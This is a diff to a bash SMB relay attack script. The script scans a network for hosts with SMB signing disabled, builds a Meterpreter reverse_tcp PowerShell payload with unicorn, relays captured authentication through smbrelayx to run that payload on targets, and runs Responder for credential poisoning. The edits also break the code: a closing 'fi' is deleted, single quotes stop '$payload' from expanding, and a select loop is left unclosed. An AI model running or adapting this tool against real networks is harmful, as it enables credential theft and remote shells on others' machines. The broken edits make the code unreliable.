@@ -28,7 +28,15 @@ echo "
 ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
 
 SMB Relay Script
-By Jason Soto "
+By Jason Soto
+
+***************************************************************
+* Running this tool without prior mutual consent is Illegal   *
+* It is the END user responsibility to obey all applicable    *
+* Laws. Author assume no liability and is not responsible for *
+* any misuse of this tool.                                    *
+***************************************************************
+"
 echo
 echo
 
@@ -37,7 +45,7 @@ echo
 clear
 f_banner
 
-for port in 21/tcp 25/tcp 53/tcp 80/tcp 88/tcp 110/tcp 139/tcp 143/tcp 1433/tcp 443/tcp 587/tcp 389/tcp 445/tcp 3141/tcp 53/udp 88/udp 137/udp 138/udp 5353/udp 5355/udp; do
+for port in 21/tcp 25/tcp 53/tcp 80/tcp 110/tcp 139/tcp 1433/tcp 443/tcp 587/tcp 389/tcp 445/tcp 3141/tcp 53/udp 137/udp 138/udp 5553/udp; do
   if [ `fuser $port 2>&1 |wc -l` -gt 0 ]; then
     echo "port $port busy, please check"
     exit 0
@@ -46,12 +54,12 @@ done
 
 echo "Please enter IP or Network to scan for SMB:" ; read network
 nmap -n -Pn -sS --script smb-security-mode.nse -p445 -oA relayer $network  >>relayer.log &
-echo "Scanning for SMB hosts..."
+echo "Scanning for SMB hosts and NETBIOS name...It may take a little while"
 wait
 echo > ./relayer.hosts
 
-for ip in $(grep open relayer.gnmap |cut -d " " -f 2 ); do
-  lines=$(egrep -A 15 "for $ip$" relayer.nmap |grep disabled |wc -l)
+for ip in $(grep open relayer.gnmap |cut -d ' ' -f 2 ); do
+  lines=$(grep -E -A 15 "for $ip$" relayer.nmap |grep disabled |wc -l)
   if [ $lines -gt 0 ]; then
       nbtname=$(nbtscan  $ip | awk -F" " '{print $2}' | tail -1)
       echo "$ip($nbtname)" >> ./relayer.hosts
@@ -96,7 +104,6 @@ elif [ "$select" = "2" ]; then
   echo ""
   echo "Please enter port for reverse connection"
   echo -ne ">"; read lport
-fi
 
 echo "Generating Payload..."
 python unicorn/unicorn.py windows/meterpreter/reverse_tcp $lhost $lport
@@ -104,12 +111,16 @@ payload=$(cat powershell_attack.txt)
 echo "Payload created"
 echo "Starting SMBRelayX..."
 
-smbrelayx.py -h $target -c "$payload"  >> ./relayer.log  &
+smbrelayx.py -h $target -c '$payload'  >> ./relayer.log  &
 sleep 2
 
-echo "Starting Responder..."
+echo ""
+echo "Select Interface to run Responder"
 
-responder -I $(netstat -ie | grep -B1 $lhost  | head -n1 | awk '{print $1}' | sed 's/://') -wrfF >>relayer.log &
+iface=$(netstat -i | cut -d ' ' -f1 | sed 1,2d)
+select netiface in $iface ; do
+echo "Starting Responder on $netiface..."
+responder -I $netiface -wrfF >>relayer.log &
 
 echo "Setting up listener..."
 
